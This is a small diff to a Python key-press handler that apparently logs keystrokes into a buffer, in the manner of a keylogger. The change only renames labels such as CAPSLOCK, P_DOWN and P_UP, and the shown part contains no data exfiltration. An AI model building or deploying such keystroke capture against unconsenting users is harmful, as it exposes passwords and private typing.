@@ -37,7 +37,7 @@ def kp(k):
 		wl()
 
 	elif k == Key.caps_lock:
-		kbuf += ' CAPS\n'
+		kbuf += ' CAPSLOCK\n'
 		wl()
 
 	elif k == Key.ctrl or k == Key.ctrl_l:
@@ -77,11 +77,11 @@ def kp(k):
 		wl()
 
 	elif k == Key.page_down:
-		kbuf += ' PAGEDOWN\n'
+		kbuf += ' P_DOWN\n'
 		wl()
 
 	elif k == Key.page_up:
-		kbuf += ' PAGEUP\n'
+		kbuf += ' P_UP\n'
 		wl()
 
 	elif k == Key.right:
